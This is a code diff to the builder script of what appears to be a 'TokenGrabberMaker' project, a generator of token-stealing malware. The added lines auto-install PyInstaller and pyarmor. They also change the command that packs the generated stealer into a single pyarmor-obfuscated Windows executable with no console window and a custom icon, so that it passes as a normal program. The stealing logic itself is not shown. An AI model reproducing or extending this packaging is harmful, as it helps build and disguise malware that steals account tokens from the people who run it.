@@ -16,6 +16,16 @@ except:
     print("Installation du module PySimpleGUI en cours...")
     os.system(f"{sys.executable} -m pip install pysimplegui")
     import PySimpleGUI as sg
+try:
+    import PyInstaller.__main__
+except:
+    print("Installation du module pyarmor en cours...")
+    os.system(f"{sys.executable} -m pip install pyinstaller")
+try:
+    from pyarmor.pyarmor import main
+except:
+    print("Installation du module pyarmor en cours...")
+    os.system(f"{sys.executable} -m pip install pyarmor")
 
 def build():
     version = requests.get("https://raw.githubusercontent.com/Teobre/TokenGrabberMaker/main/Files/version")
@@ -78,7 +88,7 @@ def build():
             os.chdir('Executable\\')
             icon = value['iconpath']
             name = value['name']
-            os.system(f"""pyarmor pack -e \" --noconsole -F '--icon={icon}'\" \"{os.getcwd()}\\{name}.py\"""")
+            os.system(f"""{sys.executable} -m pyarmor pack -e \" --noconsole -F '--icon={icon}'\" \"{os.getcwd()}\\{name}.py\"""")
             shutil.move(f"{os.getcwd()}\\dist\\{name}.exe", f"{os.getcwd()}\\{name}.exe")
             shutil.rmtree('build')
             shutil.rmtree('dist')
